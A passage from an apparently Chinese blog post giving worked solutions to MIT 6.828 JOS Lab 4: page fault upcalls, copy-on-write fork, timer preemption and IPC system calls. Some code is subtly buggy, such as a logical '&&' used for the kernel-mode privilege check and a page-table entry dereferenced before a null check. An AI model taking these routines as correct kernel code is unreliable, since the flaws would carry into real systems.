class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs &amp;&amp; <span class="number">0x1</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">panic(<span class="string">&quot;page fault in kernel-mode,fault address %d\n&quot;</span>,fault_va);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the environment&#x27;s page fault upcall, if one exists.  Set up a</span></span><br><span class="line"><span class="comment">// page fault stack frame on the user exception stack (below</span></span><br><span class="line"><span class="comment">// UXSTACKTOP), then branch to curenv-&gt;env_pgfault_upcall.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The page fault upcall might cause another page fault, in which case</span></span><br><span class="line"><span class="comment">// we branch to the page fault upcall recursively, pushing another</span></span><br><span class="line"><span class="comment">// page fault stack frame on top of the user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It is convenient for our code which returns from a page fault</span></span><br><span class="line"><span class="comment">// (lib/pfentry.S) to have one word of scratch space at the top of the</span></span><br><span class="line"><span class="comment">// trap-time stack; it allows us to more easily restore the eip/esp. In</span></span><br><span class="line"><span class="comment">// the non-recursive case, we don&#x27;t have to worry about this because</span></span><br><span class="line"><span class="comment">// the top of the regular user stack is free.  In the recursive case,</span></span><br><span class="line"><span class="comment">// this means we have to leave an extra word between the current top of</span></span><br><span class="line"><span class="comment">// the exception stack and the new stack frame because the exception</span></span><br><span class="line"><span class="comment">// stack _is_ the trap-time stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If there&#x27;s no page fault upcall, the environment didn&#x27;t allocate a</span></span><br><span class="line"><span class="comment">// page for its exception stack or can&#x27;t write to it, or the exception</span></span><br><span class="line"><span class="comment">// stack overflows, then destroy the environment that caused the fault.</span></span><br><span class="line"><span class="comment">// Note that the grade script assumes you will first check for the page</span></span><br><span class="line"><span class="comment">// fault upcall and print the &quot;user fault va&quot; message below if there is</span></span><br><span class="line"><span class="comment">// none.  The remaining three checks can be combined into a single test.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   user_mem_assert() and env_run() are useful here.</span></span><br><span class="line"><span class="comment">//   To change what the user environment runs, modify &#x27;curenv-&gt;env_tf&#x27;</span></span><br><span class="line"><span class="comment">//   (the &#x27;tf&#x27; variable points at &#x27;curenv-&gt;env_tf&#x27;).</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (curenv-&gt;env_pgfault_upcall) &#123;</span><br><span class="line"><span class="keyword">uintptr_t</span> stacktop = UXSTACKTOP;</span><br><span class="line"><span class="keyword">if</span> (UXSTACKTOP - PGSIZE &lt; tf-&gt;tf_esp &amp;&amp; tf-&gt;tf_esp &lt; UXSTACKTOP) &#123;</span><br><span class="line">stacktop = tf-&gt;tf_esp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> size = <span class="keyword">sizeof</span>(struct UTrapframe) + <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">user_mem_assert(curenv, (<span class="keyword">void</span> *)stacktop - size, size, PTE_U | PTE_W);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span> *<span class="title">utr</span> =</span> (struct UTrapframe *)(stacktop - size);</span><br><span class="line">utr-&gt;utf_fault_va = fault_va;</span><br><span class="line">utr-&gt;utf_err = tf-&gt;tf_err;</span><br><span class="line">utr-&gt;utf_regs = tf-&gt;tf_regs;</span><br><span class="line">utr-&gt;utf_eip = tf-&gt;tf_eip;</span><br><span class="line">utr-&gt;utf_eflags = tf-&gt;tf_eflags;</span><br><span class="line">utr-&gt;utf_esp = tf-&gt;tf_esp;<span class="comment">//UXSTACKTOP栈上需要保存发生缺页异常时的%esp和%eip</span></span><br><span class="line"></span><br><span class="line">curenv-&gt;env_tf.tf_eip = (<span class="keyword">uintptr_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">curenv-&gt;env_tf.tf_esp = (<span class="keyword">uintptr_t</span>)utr;</span><br><span class="line">env_run(curenv);<span class="comment">//重新进入用户态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="User-mode-Page-Fault-Entrypoint"><a href="#User-mode-Page-Fault-Entrypoint" class="headerlink" title="User-mode Page Fault Entrypoint"></a>User-mode Page Fault Entrypoint</h4><p><strong>exercise10</strong></p><p>现在需要实现lib/pfentry.S中的_pgfault_upcall函数，该函数会作为系统调用sys_env_set_pgfault_upcall()的参数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addl $<span class="number">8</span>, %esp                 <span class="comment">// esp+8 -&gt; PushRegs   over utf_fault_va utf_err</span></span><br><span class="line">   movl <span class="number">0x20</span>(%esp), %eax         <span class="comment">// eax = (esp+0x20 -&gt; utf_eip )</span></span><br><span class="line">   subl $<span class="number">4</span>, <span class="number">0x28</span>(%esp)           <span class="comment">// for trap time eip 保留32bit,   esp+48 = utf_esp</span></span><br><span class="line">   movl <span class="number">0x28</span>(%esp), %edx         <span class="comment">// %edx = utf_esp-4  </span></span><br><span class="line">   movl %eax, (%edx)             <span class="comment">// %eax = eip ----&gt; esp-4  以至于ret可以直接读取其继续执行的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Restore the trap-time registers.  After you do this, you</span></span><br><span class="line"><span class="comment">// can no longer modify any general-purpose registers.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">popal              <span class="comment">// after popal esp-&gt;utf_eip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Restore eflags from the stack.  After you do this, you can</span></span><br><span class="line"><span class="comment">// no longer use arithmetic operations or anything else that</span></span><br><span class="line"><span class="comment">// modifies eflags.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addl $<span class="number">4</span>, %esp      <span class="comment">// esp+4 -&gt; utf_eflags</span></span><br><span class="line">   popfl</span><br><span class="line"></span><br><span class="line"><span class="comment">// Switch back to the adjusted trap-time stack.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">popl %esp</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return to re-execute the instruction that faulted.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>exercise11</strong></p><p>完成lib/pgfault.c中的set_pgfault_handler()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">set_pgfault_handler(<span class="keyword">void</span> (*handler)(struct UTrapframe *utf))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// First time through!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;set_pgfault_handler not implemented&quot;);</span></span><br><span class="line">sys_page_alloc(sys_getenvid(), (<span class="keyword">void</span> *) (UXSTACKTOP - PGSIZE), PTE_SYSCALL);</span><br><span class="line">        sys_env_set_pgfault_upcall(sys_getenvid(), _pgfault_upcall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save handler pointer for assembly to call.</span></span><br><span class="line">_pgfault_handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="缺页处理小结："><a href="#缺页处理小结：" class="headerlink" title="缺页处理小结："></a>缺页处理小结：</h4><ol><li>引发缺页中断，执行内核函数链子：trap()-&gt;trap_dispatch()-&gt;page_fault_handler()</li><li>page_fault_handler()切换到用户异常栈，并且压入UTrapframe结构，然后调用curenv-&gt;env_pgfault_upcall(系统调用sys_env_set_pgfault_upcall()设置，之前已经设置为_pgfault_upcall)处的代码。又重新回到用户态。</li><li>执行_pgfault_upcall处的代码，调用pgfault_handler(库函数set_pgfault_handler()设置)处的代码，最后返回到缺页处理中断发生时的那条指令重新执行。</li></ol><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_4_%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91.png" alt="JOS缺页异常处理逻辑"></p><h3 id="Implementing-Copy-on-Write-Fork"><a href="#Implementing-Copy-on-Write-Fork" class="headerlink" title="Implementing Copy-on-Write Fork"></a>Implementing Copy-on-Write Fork</h3><p>到目前已经可以实现用户级别的写时拷贝fork函数了。fork流程如下：</p><ol><li>使用set_pgfault_handler()设置缺页处理函数。</li><li>调用sys_exofork()系统调用，在内核中创建一个Env结构，复制当前用户环境寄存器状态，UTOP以下的页目录还没有建立，新创建的进程还不能直接运行。</li><li>拷贝父进程的页表和页目录到子进程。对于可写的页，将对应的PTE的PTE_COW位设置为1。</li><li>为子进程设置_pgfault_upcall。</li><li>将子进程状态设置为ENV_RUNNABLE。</li></ol><p>缺页处理函数pgfault()流程如下：</p><ol><li>如果发现错误是因为写造成的（错误码是FEC_WR）并且该页的PTE_COW是1，则进行执行第2步，否则直接panic。</li><li>分配一个新的物理页，并将之前出现错误的页的内容拷贝到新的物理页，然后重新映射线性地址到新的物理页。</li></ol><p><strong>exercise12</strong></p><p>实现lib/fork.c中的fork, duppage and pgfault。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pgfault(struct UTrapframe *utf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="keyword">uint32_t</span> err = utf-&gt;utf_err;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the faulting access was (1) a write, and (2) to a</span></span><br><span class="line"><span class="comment">// copy-on-write page.  If not, panic.</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use the read-only page table mappings at uvpt</span></span><br><span class="line"><span class="comment">//   (see &lt;inc/memlayout.h&gt;).</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (!((err &amp; FEC_WR) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_COW))) &#123; <span class="comment">//只有因为写操作写时拷贝的地址这中情况，才可以抢救。否则一律panic</span></span><br><span class="line">panic(<span class="string">&quot;pgfault():not cow&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a new page, map it at a temporary location (PFTEMP),</span></span><br><span class="line"><span class="comment">// copy the data from the old page to the new page, then move the new</span></span><br><span class="line"><span class="comment">// page to the old page&#x27;s address.</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   You should make three system calls.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, PFTEMP, PTE_U|PTE_P)) &lt; <span class="number">0</span>)<span class="comment">//将当前进程PFTEMP也映射到当前进程addr指向的物理页</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_map: %e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, addr, PTE_P|PTE_U|PTE_W)) &lt; <span class="number">0</span>)<span class="comment">//令当前进程addr指向新分配的物理页</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_alloc: %e&quot;</span>, r);</span><br><span class="line">memmove(addr, PFTEMP, PGSIZE);<span class="comment">//将PFTEMP指向的物理页拷贝到addr指向的物理页</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, PFTEMP)) &lt; <span class="number">0</span>)<span class="comment">//解除当前进程PFTEMP映射</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_unmap: %e&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">duppage(<span class="keyword">envid_t</span> envid, <span class="keyword">unsigned</span> pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span>*) (pn * PGSIZE);</span><br><span class="line"><span class="keyword">if</span> (uvpt[pn] &amp; PTE_SHARE) &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_SYSCALL);<span class="comment">//对于表示为PTE_SHARE的页，拷贝映射关系，并且两个进程都有读写权限</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uvpt[pn] &amp; PTE_W) || (uvpt[pn] &amp; PTE_COW)) &#123; <span class="comment">//对于UTOP以下的可写的或者写时拷贝的页，拷贝映射关系的同时，需要同时标记当前进程和子进程的页表项为PTE_COW</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_U|PTE_P);<span class="comment">//对于只读的页，只需要拷贝映射关系即可</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">envid_t</span></span><br><span class="line">fork(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">void</span> _pgfault_upcall(<span class="keyword">void</span>);</span><br><span class="line">set_pgfault_handler(pgfault);<span class="comment">//设置缺页处理函数</span></span><br><span class="line"><span class="keyword">envid_t</span> envid = sys_exofork();<span class="comment">//系统调用，只是简单创建一个Env结构，复制当前用户环境寄存器状态，UTOP以下的页目录还没有建立</span></span><br><span class="line"><span class="keyword">if</span> (envid == <span class="number">0</span>) &#123;<span class="comment">//子进程将走这个逻辑</span></span><br><span class="line">thisenv = &amp;envs[ENVX(sys_getenvid())];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (envid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">panic(<span class="string">&quot;sys_exofork: %e&quot;</span>, envid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; USTACKTOP; addr += PGSIZE) &#123;</span><br><span class="line"><span class="keyword">if</span> ((uvpd[PDX(addr)] &amp; PTE_P) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_P) </span><br><span class="line">&amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_U)) &#123;</span><br><span class="line">duppage(envid, PGNUM(addr));<span class="comment">//拷贝当前进程映射关系到子进程</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(envid, (<span class="keyword">void</span> *)(UXSTACKTOP-PGSIZE), PTE_P | PTE_W | PTE_U)) &lt; <span class="number">0</span>)<span class="comment">//为子进程分配异常栈</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_alloc: %e&quot;</span>, r);</span><br><span class="line">sys_env_set_pgfault_upcall(envid, _pgfault_upcall);<span class="comment">//为子进程设置_pgfault_upcall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = sys_env_set_status(envid, ENV_RUNNABLE)) &lt; <span class="number">0</span>)<span class="comment">//设置子进程为ENV_RUNNABLE状态</span></span><br><span class="line">panic(<span class="string">&quot;sys_env_set_status: %e&quot;</span>, r);</span><br><span class="line"><span class="keyword">return</span> envid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Part-C-Preemptive-Multitasking-and-Inter-Process-communication-IPC"><a href="#Part-C-Preemptive-Multitasking-and-Inter-Process-communication-IPC" class="headerlink" title="Part C: Preemptive Multitasking and Inter-Process communication (IPC)"></a>Part C: Preemptive Multitasking and Inter-Process communication (IPC)</h2><p>在partC部分，我们要实现抢占非协作式环境，并且实现进程间通信。</p><h3 id="Clock-Interrupts-and-Preemption"><a href="#Clock-Interrupts-and-Preemption" class="headerlink" title="Clock Interrupts and Preemption"></a>Clock Interrupts and Preemption</h3><p>如果一个进程获得CPU后一直死循环而不主动让出CPU的控制权， 整个系统都将 halt。为了允许内核抢占正在运行的环境，强行重获CPU控制权，我们必须扩展JOS内核以支持来自时钟的外部硬件中断。</p><h4 id="Interrupt-discipline"><a href="#Interrupt-discipline" class="headerlink" title="Interrupt discipline"></a>Interrupt discipline</h4><p>外部中断（如设备中断）被称为 IRQs。 IRQ号到 IDT 项的映射不是固定的，其会加上一个IRQ_OFFSET的偏移，在picirq.c的pic_init中进行了这个映射过程。外部中断的初始化，实际上就是对硬件 8259A的初始化。</p><p>我们必须确保在用户环境中运行时设置FL_IF标志，以便在中断到达时，它将被传递到处理器并由中断代码处理。 否则，中断将被屏蔽或被忽略，直到重新启用中断为止。Bootloader 的第一条指令屏蔽了中断，到目前为止，我们还没有重新使能它们。</p><p><strong>exercise13</strong></p><p>首先修改Trapentry.s，当调用硬件中断处理时，处理器不会传入错误代码，因此我们需要调用TRAPHANDLER_NOEC宏。添加如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(timer_handler, IRQ_OFFSET + IRQ_TIMER);</span><br><span class="line">TRAPHANDLER_NOEC(kbd_handler, IRQ_OFFSET + IRQ_KBD);</span><br><span class="line">TRAPHANDLER_NOEC(serial_handler, IRQ_OFFSET + IRQ_SERIAL);</span><br><span class="line">TRAPHANDLER_NOEC(spurious_handler, IRQ_OFFSET + IRQ_SPURIOUS);</span><br><span class="line">TRAPHANDLER_NOEC(ide_handler, IRQ_OFFSET + IRQ_IDE);</span><br><span class="line">TRAPHANDLER_NOEC(error_handler, IRQ_OFFSET + IRQ_ERROR);</span><br></pre></td></tr></table></figure><p>然后修改trap.c，注册IDT</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kbd_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serial_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spurious_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ide_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handler</span><span class="params">()</span></span>;</span><br><span class="line">...</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + IRQ_TIMER],<span class="number">0</span>,GD_KT,timer_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_KBD],<span class="number">0</span>,GD_KT,kbd_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_SERIAL],<span class="number">0</span>,GD_KT,serial_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_SPURIOUS],<span class="number">0</span>,GD_KT,spurious_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_IDE],<span class="number">0</span>,GD_KT,ide_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_ERROR],<span class="number">0</span>,GD_KT,error_handler,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在env_alloc中加入以下代码， 同时取消 sched_halt()中sti的注释，使能中断。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Enable interrupts while in user mode.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">e-&gt;env_tf.tf_eflags |= FL_IF;</span><br></pre></td></tr></table></figure><h4 id="Handling-Clock-Interrupts"><a href="#Handling-Clock-Interrupts" class="headerlink" title="Handling Clock Interrupts"></a>Handling Clock Interrupts</h4><p>目前程序一旦进入用户模式，除非发生中断，否则CPU永远不会再执行内核代码。我们需要开启时钟中断，强迫进入内核，然后内核就可以切换另一个进程执行。<br>lapic_init()和pic_init()设置时钟中断控制器产生中断。需要写代码来处理中断。</p><p><strong>exercise14</strong></p><p>修改内核的trap_dispatch()函数，使其在发生时钟中断时调用 sched_yield()以查找并运行不同的环境。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Handle clock interrupts. Don&#x27;t forget to acknowledge the</span></span><br><span class="line"><span class="comment">// interrupt using lapic_eoi() before calling the scheduler!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>(tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_TIMER)&#123;</span><br><span class="line">lapic_eoi();</span><br><span class="line">sched_yield();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时make grade ，我们能够得到65/80。</p><h3 id="Inter-Process-communication-IPC"><a href="#Inter-Process-communication-IPC" class="headerlink" title="Inter-Process communication (IPC)"></a>Inter-Process communication (IPC)</h3><p>到目前为止，我们都在做隔离的事情。操作系统另一个重要的内容是允许程序相互交流。</p><h4 id="IPC-in-JOS"><a href="#IPC-in-JOS" class="headerlink" title="IPC in JOS"></a>IPC in JOS</h4><p>我们将要实现sys_ipc_recv()和sys_ipc_try_send()这两个系统调用，来实现进程间通信。并且实现两个包装函数ipc_recv()和 ipc_send()。<br>JOS中进程间通信的“消息”包含两部分：</p><ol><li>一个32位的值。</li><li>可选的页映射关系。</li></ol><h4 id="Sending-and-Receiving-Messages"><a href="#Sending-and-Receiving-Messages" class="headerlink" title="Sending and Receiving Messages"></a>Sending and Receiving Messages</h4><p>sys_ipc_recv()和sys_ipc_try_send()是这么协作的：</p><ol><li>当某个进程调用sys_ipc_recv()后，该进程会阻塞（状态被置为ENV_NOT_RUNNABLE），直到另一个进程向它发送“消息”。当进程调用sys_ipc_recv()传入dstva参数时，表明当前进程准备接收页映射。</li><li>进程可以调用sys_ipc_try_send()向指定的进程发送“消息”，如果目标进程已经调用了sys_ipc_recv()，那么就发送数据，然后返回0，否则返回-E_IPC_NOT_RECV，表示目标进程不希望接受数据。当传入srcva参数时，表明发送进程希望和接收进程共享srcva对应的物理页。如果发送成功了发送进程的srcva和接收进程的dstva将指向相同的物理页</li></ol><p><strong>exercise15</strong></p><p>首先是两个系统调用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_ipc_try_send(<span class="keyword">envid_t</span> envid, <span class="keyword">uint32_t</span> value, <span class="keyword">void</span> *srcva, <span class="keyword">unsigned</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_ipc_try_send not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">rcvenv</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = envid2env(envid,&amp;rcvenv,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret) <span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span>(!rcvenv-&gt;env_ipc_recving) <span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(srcva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_lookup(curenv-&gt;env_pgdir,srcva,&amp;pte);</span><br><span class="line"></span><br><span class="line"><span class="comment">//按注释顺序</span></span><br><span class="line"><span class="keyword">if</span>(srcva != ROUNDDOWN(srcva,PGSIZE)) <span class="keyword">return</span> -E_INVAL;<span class="comment">//不是页对齐</span></span><br><span class="line"><span class="keyword">if</span>((*pte &amp; perm) != perm) <span class="keyword">return</span> -E_INVAL; <span class="comment">//权限问题 perm应该是要包含于*pte中的</span></span><br><span class="line"><span class="keyword">if</span> (!pp) <span class="keyword">return</span> -E_INVAL; <span class="comment">//src物理页未映射</span></span><br><span class="line"><span class="keyword">if</span>((perm &amp; PTE_W) &amp;&amp; !(*pte &amp; PTE_W)) <span class="keyword">return</span> -E_INVAL; <span class="comment">//没有写权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(rcvenv-&gt;env_ipc_dstva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line">ret = page_insert(rcvenv-&gt;env_pgdir,pp,rcvenv-&gt;env_ipc_dstva,perm);<span class="comment">//共享相同的映射关系</span></span><br><span class="line"><span class="keyword">if</span>(ret) <span class="keyword">return</span> ret;</span><br><span class="line">rcvenv-&gt;env_ipc_perm = perm;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//send successed and update the target&#x27;s ipc</span></span><br><span class="line">rcvenv-&gt;env_ipc_recving = <span class="number">0</span>;<span class="comment">//标记接受进程可再次接受信息</span></span><br><span class="line">rcvenv-&gt;env_ipc_from = curenv-&gt;env_id;</span><br><span class="line">rcvenv-&gt;env_ipc_value = value;</span><br><span class="line">rcvenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line">rcvenv-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_ipc_recv(<span class="keyword">void</span> *dstva)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_ipc_recv not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(dstva &lt; (<span class="keyword">void</span>*)UTOP)&#123;</span><br><span class="line"><span class="keyword">if</span>(dstva != ROUNDDOWN(dstva,PGSIZE))&#123;</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">curenv-&gt;env_ipc_recving = <span class="number">1</span>;</span><br><span class="line">curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">curenv-&gt;env_ipc_dstva = dstva;</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把他们封装给用户态</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">ipc_send(<span class="keyword">envid_t</span> to_env, <span class="keyword">uint32_t</span> val, <span class="keyword">void</span> *pg, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;ipc_send not implemented&quot;);</span></span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pg = (<span class="keyword">void</span>*)<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">r = sys_ipc_try_send(to_env,val,pg,perm);</span><br><span class="line"><span class="keyword">if</span>(r == <span class="number">0</span>)&#123;</span><br><span 